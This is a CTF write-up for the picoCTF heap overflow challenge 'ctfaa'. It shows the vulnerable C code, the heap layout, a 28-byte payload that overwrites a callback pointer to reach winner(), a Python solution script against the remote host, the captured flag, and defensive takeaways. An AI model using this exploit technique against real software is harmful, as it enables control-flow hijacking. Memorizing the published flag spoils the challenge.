# picoCTF — Heap Overflow (ctfaa)

**Flag:** `picoCTF{h34p_0v3rfl0w_b59f3184}`
**Remote:** `nc foggy-cliff.picoctf.net 65277`
**Files:** `vuln` (32-bit ELF, no PIE, not stripped), `vuln.c`

## The bug

```c
struct internet {
    int priority;
    char *name;
    void (*callback)();
};

i1 = malloc(sizeof(struct internet));   // 12 bytes
i1->name = malloc(8);
i2 = malloc(sizeof(struct internet));
i2->name = malloc(8);

strcpy(i1->name, argv[1]);   // <-- unbounded copy into an 8-byte heap chunk
strcpy(i2->name, argv[2]);

if (i1->callback) i1->callback();
if (i2->callback) i2->callback();
```

`strcpy` into `i1->name` (a `malloc(8)`) has no bounds check. Heap chunks are
allocated sequentially, so a long `argv[1]` walks straight out of the name
chunk and into the `i2` struct that sits directly after it — including its
`callback` function pointer, which is then called.

## Heap layout (32-bit glibc, verified in gdb)

The binary prints and flushes before mallocing, so the stdout buffer
(malloc(0x1000)) is allocated first. Subsequent chunks, relative to
`i1->name`'s data:

```
i1->name data   +0x00   (usable 16 bytes: 8 data + prev_size reuse)
i2->priority    +0x10
i2->name        +0x14
i2->callback    +0x18
```

Offsets are stable across runs even though the heap *base* is randomized
(brk ASLR) — only relative layout matters.

## Exploit

`argv[1]` = 28 bytes, NULL-free:

```
'A' * 20                    # filler up to i2 struct
p32(0x0804c048)             # i2->name  -> writable .bss/data page
p32(0x080492b6)             # i2->callback -> winner()
```

Details that matter:

- **`i2->name` must be a valid writable pointer.** `strcpy(i2->name, argv[2])`
  runs *after* the overflow, so whatever bytes land at `+0x14` get used as the
  write destination. It cannot point at the heap (base is randomized), so it
  points at the binary's data segment instead — fixed at `0x0804c0xx` because
  the binary is not PIE.
- **Payload must be NULL-free.** `strcpy` stops at the first NUL, and the
  addresses `0x0804c048` / `0x080492b6` (little-endian `48 c0 04 08`,
  `b6 92 04 08`) conveniently contain none.
- `i1->callback` is untouched (still NULL), so control flows to the
  `i2->callback()` check, which now holds `winner` and prints `flag.txt`.

## Solution script

```python
#!/usr/bin/env python3
import os, struct, sys

WINNER   = 0x080492b6
WRITABLE = 0x0804c048

payload = b'A'*20 + struct.pack('<I', WRITABLE) + struct.pack('<I', WINNER)
assert b'\x00' not in payload

# remote version:
import socket, time
s = socket.create_connection(('foggy-cliff.picoctf.net', 65277), timeout=15)
time.sleep(1)
s.sendall(payload + b' ' + b'AAA\n')
s.settimeout(10)
data = b''
try:
    while (c := s.recv(4096)):
        data += c
except socket.timeout:
    pass
print(data.decode('latin1', 'replace'))
```

Output:

```
Enter two names separated by space:
FLAG: picoCTF{h34p_0v3rfl0w_b59f3184}
```

## Debugging gotchas (cost me the most time)

1. **gdb mangles non-ASCII argv.** gdb converts arguments through the host
   charset, so byte `0xc0` became `0xc3 0x80` (UTF-8 for `À`), silently
   corrupting the written address. Any exploit payload passed to gdb's `run`
   gets mangled — dump/verify the actual bytes the program receives instead.
2. **Python re-encodes `str` argv to UTF-8.** Passing the payload as a
   `latin1`-decoded `str` to `subprocess`/`os.execve` corrupts it the same
   way. Pass raw `bytes` (`os.execve` with a `bytes` argv) — NUL-free bytes
   are fine, only embedded NULs are rejected.
3. **gdb disables ASLR by default.** The exploit worked under gdb with a
   hardcoded heap address but segfaulted outside; the fix was to stop using
   heap pointers entirely (point `i2->name` at fixed .bss) and keep only
   relative chunk offsets.

## Takeaways

- Sequential heap allocations + unbounded `strcpy` = overwrite of the next
  chunk's metadata *and* data (classic "heap overflow 0" style, similar to
  picoCTF's `heap0`).
- Function pointers inside structs immediately after an overflowable buffer
  are a direct control-flow hijack primitive.
- Use `snprintf`/`strncpy`/length checks; never `strcpy` attacker input into
  a fixed heap allocation.
